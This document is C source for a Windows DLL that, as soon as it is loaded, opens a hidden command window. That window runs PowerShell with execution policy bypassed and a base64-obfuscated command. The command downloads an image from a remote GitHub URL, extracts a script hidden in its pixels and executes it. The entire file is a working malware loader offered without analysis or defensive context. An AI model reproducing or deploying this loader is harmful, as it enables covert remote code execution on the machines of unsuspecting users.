#include <stdio.h>
#include <windows.h>

void Shell()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;	
	char cmd[688];

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));	

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
		
	char *args[688] = {" /c \"c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -noninteractive iex([system.text.encoding]::default.getstring([system.convert]::frombase64string('c2FsIGEgbmV3LW9iamVjdDthZGQtdHlwZSAtYSBzeXN0ZW0uZHJhd2luZzskZz1hIHN5c3RlbS5kcmF3aW5nLmJpdG1hcCgoYSBuZXQud2ViY2xpZW50KS5vcGVucmVhZCgiaHR0cHM6Ly9naXRodWIuY29tL3dzaGVwaGVyZDAwMTAvY290c3RyaWNrbGFuZC9yYXcvbWFzdGVyL3dlbGNvbWUucG5nIikpOyRvPWEgYnl0ZVtdIDYyMjA4OygwLi4xNDMpfCV7Zm9yZWFjaCgkeCBpbigwLi4xNDMpKXskcD0kZy5nZXRwaXhlbCgkeCwkXyk7JG9bKCRfKjE0NCskeCkqM109JHAuYjskb1soJF8qMTQ0KyR4KSozKzFdPSRwLmc7JG9bKCRfKjE0NCskeCkqMysyXT0kcC5yfX07aWV4KFtzeXN0ZW0udGV4dC5lbmNvZGluZ106OmFzY2lpLmdldHN0cmluZygkb1swLi41NzQxNF0pKQ0K')))\"\0"};
	snprintf(cmd, sizeof(cmd), "%s", args[0]);
	CreateProcess("c:\\Windows\\System32\\cmd.exe\0", cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    	
	WaitForSingleObject(pi.hProcess, INFINITE);	
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    Shell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) 
{
    HANDLE hThread;

    if (fdwReason == DLL_PROCESS_ATTACH)
        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);

    return TRUE;
}
